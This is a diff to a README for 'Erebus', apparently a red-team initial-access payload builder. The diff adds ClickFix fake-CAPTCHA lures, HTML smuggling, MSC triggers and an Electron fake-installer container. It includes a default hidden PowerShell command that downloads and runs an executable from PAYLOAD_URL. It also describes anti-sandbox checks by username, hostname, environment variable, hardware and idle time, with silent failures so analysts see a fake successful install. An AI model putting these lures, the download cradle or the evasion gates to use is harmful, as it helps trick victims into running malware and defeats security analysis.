@@ -14,9 +14,9 @@ The Erebus wrapper is a comprehensive initial access toolkit designed to generat
 - **Multiple Loader Types**: Shellcode Loader (C++) and ClickOnce (.NET)
 - **Flexible Obfuscation**: Compression, encryption, and encoding of shellcode
 - **Multiple Injection Methods**: 5+ injection techniques for both loaders
-- **Container Support**: ISO, 7z, ZIP, and MSI packaging
+- **Container Support**: ISO, 7z, ZIP, MSI, and **Electron fake-installer** packaging
 - **Code Signing**: Self-signed, spoofed, or provided certificates
-- **Trigger Mechanisms**: LNK-based triggers, BAT script triggers, and MSI package triggers with decoy files
+- **Trigger Mechanisms**: LNK, BAT, MSI, MSC, HTML smuggling, and ClickFix clipboard-lure pages (with decoy file support)
 - **DLL Hijacking**: Proxy-based DLL hijacking capability
 - **MSI Backdooring**: Multiple attack vectors for injecting payloads into existing MSI installers
 
@@ -100,12 +100,13 @@ The comprehensive build workflow for Erebus is shown below:
                          │
               ┌──────────▼──────────┐
               │ Add Trigger?        │
-              │ LNK/BAT/MSI/CO      │
+              │ LNK/BAT/MSI/MSC/    │
+              │ HTML/ClickFix       │
               └──────────┬──────────┘
                          │
             ┌────────────▼────────────┐
             │ Package Container?      │
-            │ ISO/7z/ZIP/MSI          │
+            │ ISO/7z/ZIP/MSI/Electron │
             └──────────┬──────────────┘
                        │
              ┌─────────▼──────────┐
@@ -131,8 +132,8 @@ The comprehensive build workflow for Erebus is shown below:
 3. **Obfuscation** → Apply compression, encryption, and encoding
 4. **Compilation** → Compile selected loader with obfuscated shellcode
 5. **Signing** → Optional code signing (self-signed, spoofed, or provided)
-6. **Triggering** → Add execution trigger (LNK, BAT, MSI, or ClickOnce)
-7. **Packaging** → Container the payload (ISO, 7z, ZIP, or MSI)
+6. **Triggering** → Add execution trigger (LNK, BAT, MSI, MSC, HTML Smuggling, or ClickFix)
+7. **Packaging** → Container the payload (ISO, 7z, ZIP, MSI, or Electron fake-installer)
 8. **MalDocs** → Optional Excel document generation or injection
 9. **Output** → Final packaged payload ready for delivery
 
@@ -161,7 +162,7 @@ The comprehensive build workflow for Erebus is shown below:
 - Build step name: `Sign Shellcode Loader`
 
 ### 5. Optional Trigger or MalDoc
-- **Trigger Option**: Create LNK, BAT, MSI, or ClickOnce trigger with decoy execution
+- **Trigger Option**: Create LNK, BAT, MSI, MSC, HTML Smuggling, or ClickFix trigger with decoy execution
   - Build step name: `Adding Trigger`
 - **MalDoc Option**: Create or backdoor Excel document with VBA payload
   - Build step name: `Creating MalDoc`
@@ -169,8 +170,8 @@ The comprehensive build workflow for Erebus is shown below:
   - VBA loader techniques: VirtualAlloc, EnumLocales, QueueUserAPC, or ProcessHollowing
 
 ### 6. Containerization
-- Package in ISO, 7z, ZIP, or MSI
-- Build step name: `Containerising`
+- Package in ISO, 7z, ZIP, MSI, or Electron fake-installer
+- Build step name: `Containerising` (or `Wrapping Payload in Electron Installer` when the Electron container is selected)
 
 ### 7. Delivery
 - Output final packaged payload
@@ -220,22 +221,28 @@ The comprehensive build workflow for Erebus is shown below:
   - MalDoc: Use Excel document with VBA payload as main payload
   - Determines which options are visible for sections 0.9 onwards
 
-### Trigger Configuration (Section 0.9-0.9b)
+### Trigger Configuration (Section 0.9-0.9c)
 - **0.9 Trigger Type**: Select trigger mechanism for payload execution
   - LNK: Windows shortcut file (.lnk) trigger
   - BAT: Batch script (.bat) trigger
   - MSI: Windows Installer package trigger
-  - ClickOnce: ClickOnce application trigger
+  - MSC: Windows Management Console snap-in trigger (Explorer-activated)
+  - HTML: HTML smuggling page that reconstructs a Blob via XOR+base64 in-browser
+  - ClickFix: Fake CAPTCHA lure that copies a PowerShell/cmd command to clipboard
   - Only visible when Output Extension Source = Trigger
   - Default: BAT
 - **0.9a Trigger Binary**: Executable to run when trigger is activated
   - Default: "C:\Windows\System32\conhost.exe"
-  - Hidden for MSI and ClickOnce triggers (they have custom execution paths)
+  - Hidden for MSI, MSC, HTML, ClickFix, and ClickOnce triggers (they have custom execution paths)
   - This binary is executed alongside the payload
 - **0.9b Trigger Command**: Command arguments to pass to trigger binary
   - Default: "--headless cmd.exe /Q /c erebus.exe | decoy.pdf"
-  - Hidden for MSI and ClickOnce triggers
+  - Hidden for MSI, MSC, HTML, ClickFix, and ClickOnce triggers
   - Example usage: chains execution of payload with decoy document display
+- **0.9c ClickFix Command**: Command copied to the victim's clipboard when they click the verify button on the ClickFix lure page
+  - Default: `powershell -w hidden -ep bypass -c "iwr -uri PAYLOAD_URL -outfile $env:TEMP\\update.exe; & $env:TEMP\\update.exe"`
+  - Only visible when Trigger Type = ClickFix
+  - Typically a PowerShell download cradle or a `cmd /c` chain; the HTML page walks the victim through Win+R → Ctrl+V → Enter to execute it
 
 ### MalDoc Configuration (Section 0.9-0.9g)
 - **0.9 Create MalDoc**: MalDoc generation option
@@ -318,11 +325,12 @@ The comprehensive build workflow for Erebus is shown below:
   - Note: Nim, Go, Python, PowerShell, VBA, VBScript, Rust, JavaScript, and Zig formats commented out (uncomment for custom loaders)
 
 ### Container Options (Section 3.0-3.2)
-- **3.0 Container Type**: ISO, 7z, ZIP, or MSI
+- **3.0 Container Type**: ISO, 7z, ZIP, MSI, or Electron
   - ISO: Bootable ISO media (optical disc image)
   - 7z: 7-Zip compressed archive format (highest compression)
   - ZIP: Standard ZIP archive format
   - MSI: Windows Installer package
+  - Electron: Portable `.exe` that presents a fake installer wizard and spawns the embedded loader hidden & detached
 - **3.1 Compression Level**: 0-9 (where 9 = maximum compression)
   - Only visible for 7z and ZIP containers
   - 0: No compression (fastest)
@@ -331,6 +339,55 @@ The comprehensive build workflow for Erebus is shown below:
 - **3.2 Archive Password**: Optional archive password
   - Only visible for 7z and ZIP containers
   - Leave empty for no password protection
+
+### Electron Fake-Installer Container Options (Section 3.E*)
+All fields are only visible when `3.0 Container Type = Electron`. They are baked into the portable exe's PE resource table and the wizard runtime config.
+
+- **3.E0 Electron Product Name**: Display name in the fake wizard window title and PE `ProductName`. Default: `"Acme Installer"`.
+- **3.E1 Electron Publisher**: Publisher/author string, written to `package.json.author` → PE `CompanyName`. Default: `"Acme Corporation"`.
+- **3.E2 Electron Version**: Product version, written to `package.json.version` → PE `ProductVersion` + `FileVersion`. Default: `"1.0.0"`.
+- **3.E3 Electron Architecture**: Target arch for the portable exe. `x64` (default) or `ia32`.
+- **3.E4 Electron Entry Format**: How the wizard spawns the embedded loader at install time.
+  - `exe`: Direct `CreateProcess` on the embedded PE (used for Shellcode Loader exe and ClickOnce single-file publishes)
+  - `dll`: `rundll32.exe <dll>,<entry>` (Shellcode Loader DLL output)
+  - `xll`: `excel.exe /e <xll>` (Shellcode Loader XLL Excel add-in)
+- **3.E5 Electron DLL Entry Point**: Export function passed to `rundll32` (only visible when Entry Format = dll). Default: `"DllMain"`.
+- **3.E6 Electron Build Mode**: Where the NSIS is produced.
+  - `In-Container (Wine)` (default): npm + electron-builder run inside the Erebus Docker container under wine. Produces the portable exe directly, no Windows host needed.
+  - `Deferred (Erebus.Helper)`: the builder stages the Electron project + `build_electron.bat` into the payload directory. Operator runs the bat on a Windows host via `python erebus_helper.py electron …`.
+- **3.E6a Electron Custom Icon**: Optional upload to override the vendored Erebus icon. Accepts PNG/JPEG/GIF/BMP/WEBP/TIFF/SVG; SVG is rasterized to 512×512 via `cairosvg`, then Pillow produces a multi-size ICO (16/24/32/48/64/128/256) embedded in the exe's PE resources. Leave empty for the default icon.
+- **3.E7 Electron File Description**: PE `FileDescription` string shown on the Details tab. Maps to `package.json.description`. Default: `"Setup"`.
+- **3.E8 Electron Copyright**: Legal copyright string embedded in the PE resources. Maps to `electron-builder.yml.copyright`. Default: empty.
+
+### Electron Guardrails (Section 3.E9*)
+Anti-sandbox / anti-analysis gates that defer the `%TEMP%\inst-<uuid>` loader copy and the spawn until after real user interaction AND every enabled environment check has passed. All fields are only visible when `3.0 Container Type = Electron` AND `3.E9 Enable Electron Guardrails = True`. Failures are **silent** — the wizard still shows fake progress → Finish, but nothing is copied or spawned.
+
+- **3.E9 Enable Electron Guardrails** (Boolean, default: True): Master switch. When False, all gates are bypassed — the renderer still has an Install button, but the copy fires on the first click with no dwell time and no environment checks.
+- **3.E9a Dwell Time (ms)** (default: `2500`): Minimum time the wizard must be visible before the Install button is enabled. `0` disables the dwell gate.
+- **3.E9b Require Mouse Movement** (Boolean, default: True): Requires a real non-zero-delta `mousemove` event inside the window. Filters synthetic-event automation that clicks without moving the pointer.
+- **3.E9c Check Debugger** (Boolean, default: True): Rejects if `inspector.url()`, `process.execArgv` contains `--inspect`, or `process.debugPort > 0`.
+- **3.E9d Check Sandbox Env Vars** (Boolean, default: True): Rejects on env vars from well-known sandboxes (`SBIEHOME`, `SANDBOXIE_CURRENT_DIR`, `CUCKOO_AGENT`, `JOEBOX_AGENT`, `ANALYST_USERNAME`).
+- **3.E9e Check Default Bad Usernames** (Boolean, default: True): Rejects common sandbox usernames (`sandbox`, `malware`, `maltest`, `test`, `tester`, `analyst`, `virus`, `sample`, `currentuser`, `user`, `admin`, `WDAGUtilityAccount`).
+- **3.E9f Check Default Bad Hostnames** (Boolean, default: True): Rejects hostnames containing `sandbox`, `malware`, `analyst`, `cuckoo`, `hybrid-analysis`, `vm`, `virtual`, `vbox`, `qemu`.
+- **3.E9g Hostname Whitelist** (comma-separated, default: empty): If non-empty, the installer only runs on hostnames matching this list (exact match or suffix). Empty = no whitelist check.
+- **3.E9h Hostname Blocklist** (comma-separated, default: empty): Hostnames containing any entry in this list are rejected. Empty = no blocklist check.
+- **3.E9i Username Whitelist** (comma-separated, default: empty): Only matching usernames can run the installer.
+- **3.E9j Username Blocklist** (comma-separated, default: empty): Matching usernames are rejected.
+- **3.E9k Min Screen Width** (default: `1280`): Rejects if primary display width < N pixels. `0` disables. Defeats 800×600 / 1024×768 sandbox VMs.
+- **3.E9l Min Screen Height** (default: `720`): Rejects if primary display height < N pixels. `0` disables.
+- **3.E9m Min CPU Count** (default: `2`): Rejects if the host has fewer than N logical CPUs. `0` disables. Defeats 1-CPU sandbox VMs.
+- **3.E9n Min Memory (MB)** (default: `2048`): Rejects if total RAM < N MB. `0` disables. Defeats low-memory sandbox VMs.
+- **3.E9o Max Idle Seconds** (default: `0` = off): Rejects if `powerMonitor.getSystemIdleTime() > N`. Use to reject unattended / zero-user-activity sandboxes.
+- **3.E9p Pre-Spawn Delay (ms)** (default: `0` = off): Sleep this many ms **after** every other guardrail has passed but **before** the file copy + spawn. Use 5000–15000 ms to time-out short-lived sandbox detonation windows.
+
+**Runtime behavior (install-time spawn flow):**
+1. Victim double-clicks the portable exe — Electron runtime extracts to temp and launches the wizard with the Install button **disabled**.
+2. Renderer ([src/renderer/wizard.js](Payload_Type/erebus_wrapper/erebus_wrapper/agent_code/Erebus.Loaders/Erebus.Electron/src/renderer/wizard.js)) waits for the configured dwell time AND a real `mousemove` with non-zero `movementX/Y` deltas.
+3. Once both conditions hold, the renderer calls `installer:ready` and the main process ([src/main.js](Payload_Type/erebus_wrapper/erebus_wrapper/agent_code/Erebus.Loaders/Erebus.Electron/src/main.js)) hands out a one-shot interaction token. The Install button becomes actionable.
+4. On the "Install" click, the main process handler re-checks the token, then calls `runGuardrails()` ([src/guardrails.js](Payload_Type/erebus_wrapper/erebus_wrapper/agent_code/Erebus.Loaders/Erebus.Electron/src/guardrails.js)) against every enabled `3.E9*` check.
+5. **Only if every check passes** does the handler copy `process.resourcesPath/payload/` to `%TEMP%\inst-<uuid>` and spawn the configured entry point detached + hidden via `child_process.spawn`.
+6. Wizard advances to Finish (fire-and-forget, no blocking on the child). Guardrail failures are **silent** — the wizard shows the same fake progress → Finish sequence regardless, so a sandbox observer sees a "successful" install even when the loader never ran.
+7. Temp directory is removed when the spawned child exits (or persists if the child never runs due to a guardrail failure).
 
 ### ISO-Specific Options (Section 4.0-4.2)
 - **4.0 ISO Volume ID**: Volume name shown in Windows Explorer
@@ -492,11 +549,14 @@ The Erebus builder executes the following build steps in sequence. Each step is 
 - **Description**: Create trigger mechanism for payload execution
 - **Triggers**: Only when Output Extension Source = Trigger and Main Payload Type = Loader
 - **Supported Triggers**:
-  - LNK: Windows shortcut with execution chain
-  - BAT: Batch script runner
-  - MSI: Windows Installer with custom action
-  - ClickOnce: ClickOnce application manifest
-- **Functionality**: Sets up execution of loader with optional decoy display
+  - **LNK**: Windows shortcut with execution chain and configurable icon
+  - **BAT**: Batch script runner chaining the trigger binary with decoy display
+  - **MSI**: Windows Installer with custom action
+  - **MSC**: Windows Management Console snap-in activated via Explorer / `mmc.exe`
+  - **HTML**: HTML smuggling page with XOR+base64 obfuscated payload reconstructed in-browser via `Blob`
+  - **ClickFix**: Fake CAPTCHA page that copies a PowerShell/cmd command to clipboard and walks the victim through Win+R → Ctrl+V → Enter
+  - **ClickOnce**: ClickOnce application manifest
+- **Functionality**: Sets up execution of loader with optional decoy display (where applicable)
 
 ### 11. Creating Decoy
 - **Description**: Generate or include decoy file
@@ -527,7 +587,20 @@ The Erebus builder executes the following build steps in sequence. Each step is 
   - 7z: 7-Zip compressed archive with configurable compression
   - ZIP: Standard ZIP archive with optional password
   - MSI: Windows Installer package
+  - Electron: Portable fake-installer `.exe` built via `electron-builder` (see next step)
 - **Final Output**: Compressed and packaged payload ready for deployment
+
+### 14. Wrapping Payload in Electron Installer
+- **Description**: Build the Electron fake-installer container wrapping the compiled loader
+- **Triggers**: Only when Container Type = Electron
+- **Process**:
+  1. Stage `payload/` into `Erebus.Electron/build/resources/payload/` (electron-builder `extraResources`)
+  2. Rewrite `package.json` + `electron-builder.yml` with operator-supplied metadata (product name, publisher, version, file description, copyright)
+  3. Render `src/config.js` with the configured guardrails block (dwell time, mouse movement requirement, all `3.E9*` environment checks) — read at runtime by the wizard and main process
+  4. Convert uploaded icon PNG/SVG/etc. to multi-size ICO via Pillow (+ cairosvg for SVG)
+  5. **In-Container (Wine) mode**: run `make release` → `npm install` → `electron-builder --win` (uses wine for rcedit/winCodeSign); the final portable exe is copied back to `payload/erebus.exe`
+  6. **Deferred (Erebus.Helper) mode**: stage the Electron project source tree + `build_electron.bat` runbook into `payload/electron_src/`; operator runs the bat on a Windows host
+- **Final Output**: A single portable Windows `.exe` in `payload/erebus.exe` that, when run, extracts the embedded loader to `%TEMP%\inst-<uuid>` and spawns it hidden + detached **after** the interaction + environment guardrails pass, then advances the wizard to Finish
 
 #### Build Step Status Reporting
 
@@ -563,7 +636,7 @@ If any step fails, the entire build is terminated and an error is reported to th
 - Build step name: `Sign Shellcode Loader`
 
 ### 5. Optional Trigger or MalDoc
-- **Trigger Option**: Create LNK, BAT, MSI, or ClickOnce trigger with decoy execution
+- **Trigger Option**: Create LNK, BAT, MSI, MSC, HTML Smuggling, or ClickFix trigger with decoy execution
   - Build step name: `Adding Trigger`
 - **MalDoc Option**: Create or backdoor Excel document with VBA payload
   - Build step name: `Creating MalDoc`
@@ -571,8 +644,8 @@ If any step fails, the entire build is terminated and an error is reported to th
   - VBA loader techniques: VirtualAlloc, EnumLocales, QueueUserAPC, or ProcessHollowing
 
 ### 6. Containerization
-- Package in ISO, 7z, ZIP, or MSI
-- Build step name: `Containerising`
+- Package in ISO, 7z, ZIP, MSI, or Electron fake-installer
+- Build step name: `Containerising` (or `Wrapping Payload in Electron Installer` when the Electron container is selected)
 
 ### 7. Delivery
 - Output final packaged payload
@@ -768,6 +841,23 @@ The Erebus payload wrapper includes the following production plugins:
     - Embeds payloads in custom actions
     - Configurable execution conditions
     - Supports immediate and deferred actions
+
+14. **plugin_trigger_html_smuggling.py** - HTML Smuggling + ClickFix lure pages
+    - `create_html_smuggling_trigger()`: Self-contained HTML with XOR+base64 obfuscated payload; JavaScript reverses both layers at runtime and reconstructs a `Blob` for download (defeats gateway base64 scanning)
+    - `create_clickfix_trigger()`: Fake CAPTCHA/verification page that copies a configured command (typically a PowerShell download cradle) to the clipboard via `navigator.clipboard.writeText`, then walks the victim through Win+R → Ctrl+V → Enter
+    - Randomised JS identifiers and XOR keys per build so no two pages share a decoder fingerprint
+    - No binary artifact leaves the browser for ClickFix - evades file-based AV entirely
+    - Fully malleable lure content (brand name/color, headings, step instructions, button labels)
+
+15. **plugin_container_electron.py** - Electron fake-installer container
+    - Wraps the compiled loader inside a single portable Windows `.exe` built with `electron-builder`
+    - Two build modes: In-Container (wine, no Windows host required) and Deferred (Erebus.Helper on Windows)
+    - Supports exe / dll (via rundll32) / xll (via Excel) entry formats
+    - Rewrites `package.json` + `electron-builder.yml` at build time with operator-supplied metadata so every PE resource field (FileDescription, ProductName/Version, FileVersion, Copyright, Company) is controllable via build parameters
+    - Optional custom icon upload (PNG/JPEG/GIF/BMP/WEBP/TIFF/SVG) - SVG is rasterized via cairosvg, Pillow converts to multi-size ICO for embedding
+    - Two-gate guardrail system ([src/guardrails.js](Payload_Type/erebus_wrapper/erebus_wrapper/agent_code/Erebus.Loaders/Erebus.Electron/src/guardrails.js)): a renderer-side interaction gate (dwell time + real mouse movement → one-shot token) and a main-process environment gate (debugger / sandbox env / username / hostname / screen / CPU / RAM / idle / pre-spawn delay) — the loader tree is NOT copied to `%TEMP%\inst-<uuid>` until both gates pass
+    - Configurable via the `3.E9*` BuildParameter group; failures are silent (wizard still shows fake progress → Finish even when the checks blocked the copy)
+    - At install time the wizard extracts the embedded loader to `%TEMP%\inst-<uuid>` and spawns it detached + hidden, advancing the wizard to Finish
 
 **Plugin Architecture Overview:**
 
